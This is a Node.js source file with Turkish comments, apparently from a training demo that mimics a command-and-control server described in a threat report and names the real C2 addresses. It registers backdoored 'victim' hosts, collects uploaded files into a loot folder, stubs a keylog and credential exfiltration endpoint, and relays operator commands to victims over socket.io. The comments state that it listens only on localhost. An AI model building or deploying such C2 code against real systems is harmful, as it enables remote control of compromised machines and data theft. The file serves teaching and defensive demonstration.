"use strict";
// attacker-c2/server.js
// Rapordaki C2 altyapisinin (216.126.237.99 / 88.218.0.78) egitim amacli
// karsiligi. SADECE 127.0.0.1'de dinler, gercek internete cikmaz.
// Uc nokta isimleri rapordakiyle ayni: /api/service/process/:uid,
// /api/service/makelog, /upload, /keys.

const express = require("express");
const multer = require("multer");
const http = require("http");
const path = require("path");
const fs = require("fs");
const { Server } = require("socket.io");

const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: "*" } });
const PORT = 4000;

const LOOT_DIR = path.join(__dirname, "loot");
if (!fs.existsSync(LOOT_DIR)) fs.mkdirSync(LOOT_DIR, { recursive: true });

app.use(express.json());
const upload = multer({ dest: LOOT_DIR });

const victims = new Map(); // uid -> { info, socket, connectedAt }

app.post("/api/service/process/:uid", (req, res) => {
  const uid = req.params.uid;
  const info = req.body;
  const prev = victims.get(uid) || {};
  victims.set(uid, { ...prev, info, connectedAt: prev.connectedAt || Date.now() });
  console.log(`[C2] Host kaydi: ${uid} -> ${info.host} (${info.release})`);
  res.json({ ok: true });
});

app.post("/api/service/makelog", (req, res) => {
  console.log(`[C2][log] ${req.body.host}: ${req.body.message}`);
  res.json({ ok: true });
});

app.post("/upload", upload.single("file"), (req, res) => {
  console.log(`[C2] Dosya alindi: ${req.file.originalname} <- uid=${req.body.uid}`);
  res.json({ ok: true });
});

// Rapordaki keylog/kimlik bilgisi exfil uc noktasi. Bu demoda buraya
// gercek veri gonderen bir bilesen YOK (bkz. victim-repo/surveillance/*.stub.js) --
// endpoint yalnizca protokolun tamligini gostermek icin duruyor.
app.post("/keys", (req, res) => {
  console.log("[C2] /keys cagrildi (bu demoda gercek veri tasimaz).");
  res.json({ ok: true });
});

// --- Operator (sunumu yapan kisi) icin basit HTTP API ---

app.get("/api/operator/victims", (_req, res) => {
  const list = [...victims.entries()].map(([uid, v]) => ({
    uid,
    host: v.info && v.info.host,
    os: v.info && v.info.OS,
    release: v.info && v.info.release,
    connected: Boolean(v.socket),
    since: new Date(v.connectedAt).toLocaleTimeString(),
  }));
  res.json(list);
});

app.post("/api/operator/command", (req, res) => {
  const { uid, action } = req.body;
  const victim = victims.get(uid);
  if (!victim || !victim.socket) {
    return res.status(404).json({ ok: false, error: "Kurban baglanti soketi yok" });
  }
  victim.socket.emit("command", { action });
  console.log(`[C2] Operator komutu gonderildi -> uid=${uid} action=${action}`);
  res.json({ ok: true });
});

// --- Socket.io kanali: victim-repo/scripts/backdoor.js buraya baglanir ---

io.on("connection", (socket) => {
  socket.on("register", ({ uid, host }) => {
    const prev = victims.get(uid) || {};
    victims.set(uid, { ...prev, socket, connectedAt: prev.connectedAt || Date.now() });
    console.log(`[C2] Kurban socket ile baglandi: ${uid} (${host})`);
  });

  socket.on("whoIm", (data) => console.log("[C2] whoIm yaniti:", data));

  socket.on("message", (data) => console.log("[C2] Kurbandan sonuc:", data));

  socket.on("disconnect", () => {
    for (const [uid, v] of victims.entries()) {
      if (v.socket === socket) {
        victims.set(uid, { ...v, socket: null });
        console.log(`[C2] Kurban baglantisi kesildi: ${uid}`);
      }
    }
  });
});

server.listen(PORT, "127.0.0.1", () => {
  console.log(`[C2] Mock C2 sunucusu hazir: http://127.0.0.1:${PORT} (yalnizca localhost)`);
});
